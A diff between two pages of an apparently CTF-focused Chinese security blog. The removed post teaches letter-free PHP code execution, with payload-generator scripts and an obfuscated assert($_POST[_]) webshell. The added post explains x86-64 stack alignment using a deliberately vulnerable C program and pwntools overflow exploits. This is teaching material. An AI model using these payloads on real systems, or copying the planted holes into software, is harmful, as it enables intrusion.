@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php-rce," />
+  <meta name="keywords" content="pwn-stackbalance," />
 
 
 
@@ -81,18 +81,27 @@
 
 
 
-<meta name="description" content="没有blacklist的rce是没有灵魂的！">
+<meta name="description" content="绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无字母数字RCE初探">
-<meta property="og:url" content="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/index.html">
+<meta property="og:title" content="栈平衡详解">
+<meta property="og:url" content="https://www.m0x01sery.com/2022/10/07/stack_balance/index.html">
 <meta property="og:site_name" content="M1seryの厨房">
-<meta property="og:description" content="没有blacklist的rce是没有灵魂的！">
+<meta property="og:description" content="绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-03-27T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-31T16:00:00.000Z">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221006230718.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221006231052.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007230240.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007232057.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007233355.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007233711.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007234640.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221007235102.png">
+<meta property="article:published_time" content="2022-10-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-06T16:00:00.000Z">
 <meta property="article:author" content="M1sery">
-<meta property="article:tag" content="php-rce">
+<meta property="article:tag" content="pwn-stackbalance">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.m0x01sery.com/images/20221006230718.png">
 
 
 
@@ -122,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/"/>
+  <link rel="canonical" href="https://www.m0x01sery.com/2022/10/07/stack_balance/"/>
 
 
 
 
 
-  <title>无字母数字RCE初探 | M1seryの厨房</title>
+  <title>栈平衡详解 | M1seryの厨房</title>
   
 
 
@@ -279,7 +288,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/03/28/rce_without_w_and_n/">
+    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/10/07/stack_balance/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M1sery">
@@ -296,7 +305,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">无字母数字RCE初探</h2>
+          <h2 class="post-title" itemprop="name headline">栈平衡详解</h2>
         
 
         <div class="post-meta">
@@ -308,8 +317,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-28T00:00:00+08:00">
-                2022-03-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-10-07T00:00:00+08:00">
+                2022-10-07
               </time>
             
 
@@ -324,8 +333,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2022-04-01T00:00:00+08:00">
-                2022-04-01
+              <time title="更新于" itemprop="dateModified" datetime="2022-10-07T00:00:00+08:00">
+                2022-10-07
               </time>
             
           </span>
@@ -358,63 +367,58 @@
       
 
       
-        <p>没有blacklist的rce是没有灵魂的！</p>
+        <p>绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。</p>
 <span id="more"></span>
 
-<p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p>
-<p>害羞羞，你看你就会开玩笑（指绕过</p>
-<p>本地写个青春版</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+<h1><span id="概念">概念</span></h1><blockquote>
+<p>函数如果要返回父程序，则在堆栈中进行操作的时候，一定要在RET指令之前，将ESP指向函数入栈前的地址。</p>
+<p>每调用一个CALL，就会开辟一个新的栈空间，如果没有栈平衡功能的实现，那么很容易会破坏其它栈里的数据，导致程序崩溃。</p>
+<p>在Ubuntu18以上环境的64位程序，当调用<code>printf</code>或是<code>system</code>时，需要保证RSP &amp; 0xf == 0，即16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。</p>
+</blockquote>
+<h1><span id="示例">示例</span></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1><span id="取反">取反</span></h1><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p>
-<p>举个栗子</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure>
+<p>以一个简单的栈溢出程序为例，在<code>Ubuntu 18.04</code>系统上进行64位编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&gt; gcc exp.c -o exp -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure>
 
-<p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p>
-<p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p>
-<p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p>
-<p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p>
-<p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure>
+<p>为了方便演示关闭了PIE保护和canary。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&gt; checksec --file=exp     </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64 Symbols	  No	0		1		exp</span><br></pre></td></tr></table></figure>
 
-<p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p>
-<p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p>
-<p>让我们把这段代码再回下锅</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+<p>搓个人畜无害的exp，attach上gdb进行动态调试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400571</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p>
-<p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p>
-<p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/20221006230718.png"></p>
+<p>可以看到溢出利用是成功的，至此一切正常。继续单步跳过</p>
+<p><img src="/images/20221006231052.png"></p>
+<p>步入<code>system</code>调用后，整个程序就寄在了MOVAPS指令<sup>[1]</sup>，同时抛出错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault。</span><br></pre></td></tr></table></figure>
 
-<h1><span id="异或">异或</span></h1><p>万恶之源 我很异或（疑惑）的出处</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
+<p>因为MOVAPS指令要求目标操作数是内存操作数时对齐16字节边界，如果没对齐会就会出现分段错误。</p>
+<blockquote>
+<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated. </p>
+</blockquote>
+<p>回头看现在栈上的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp   0x7fff001f9818 -&gt; 0x7fff001f9b30 &lt;- 0x0</span><br></pre></td></tr></table></figure>
 
-<p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p>
-<p>选择异或的理由？同或不行吗？当然可以!</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
+<p>此时RSP寄存器的值是0x7fff001f9818，并没有对齐16字节，即强行跳转后门函数破坏了栈平衡，需要完善栈溢出的操作。</p>
+<p>一种常见的解决方法是在调用后门函数之前塞个RET指令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x40054b</span>) + p64(<span class="number">0x400571</span>)</span><br></pre></td></tr></table></figure>
 
-<p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure>
+<p>RET指令可以看作等效于POP EIP（实际上没有这个指令<sup>[2]</sup>），也即先弹出栈顶的数据（RSP+8），之后再压栈，将RSP的值对齐16字节完成栈平衡。否则会因为此处意★义★不★明的PUSH造成函数入栈后RSP的值-8。</p>
+<p><img src="/images/20221007230240.png"></p>
+<p>可以看到RSP的值在PUSH后变回了为0x7ffd49459a20。</p>
+<p><img src="/images/20221007232057.png"></p>
+<p>单步跟进到MOVAPS指令，此时RSP寄存器的值为0x7ffd49459680，对齐16字节。</p>
+<p><img src="/images/20221007233355.png"></p>
+<p>本地成功打通。</p>
+<p><img src="/images/20221007233711.png"></p>
+<p>而难以定位RET指令的时候（如开启了PIE保护），既然此处的思想是用POP抵消掉PUSH来保证栈平衡，我们不妨做得更绝一点，要是直接舍弃意★义★不★明的PUSH呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400572</span>)</span><br></pre></td></tr></table></figure>
 
-<p>（脚本绝赞升级中）</p>
-<h1><span id="自增">自增</span></h1><p>php的字符自增和C的ASCII值自增有很大不同。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure>
-
-<p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p>
-<p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p>
-<p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure>
-
-<p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p>
-<p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure>
-
-<p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p>
-<p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p>
-<p>真搞事还得是<code>system()</code>啊（确信</p>
-<p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>
+<p><img src="/images/20221007234640.png"></p>
+<p>可以看到仍然保证了栈平衡。本地成功打通。</p>
+<p><img src="/images/20221007235102.png"></p>
+<h1><span id="外部链接">外部链接</span></h1><p>[1] <a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/movaps">Move Aligned Packed Single-Precision Floating-Point Values</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/56676840/is-pop-eip-legal-instruction">Is pop eip legal instruction?</a></p>
 
       
     </div>
@@ -432,7 +436,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php-rce/" rel="tag"># php-rce</a>
+            <a href="/tags/pwn-stackbalance/" rel="tag"># pwn-stackbalance</a>
           
         </div>
       
@@ -445,8 +449,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/03/09/computer_networks_basic/" rel="next" title="计算机网络概念入门">
-                <i class="fa fa-chevron-left"></i> 计算机网络概念入门
+              <a href="/2022/10/03/bottle_rce/" rel="next" title="python-bottle Web框架远程命令执行漏洞浅析">
+                <i class="fa fa-chevron-left"></i> python-bottle Web框架远程命令执行漏洞浅析
               </a>
             
           </div>
@@ -454,10 +458,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2022/09/19/readFileSync/" rel="prev" title="一个fs.readFileSync的trick浅析">
-                一个fs.readFileSync的trick浅析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -664,7 +664,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">取反</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">异或</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">自增</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">外部链接</span></a></li></ol></div>
             
 
           </div>
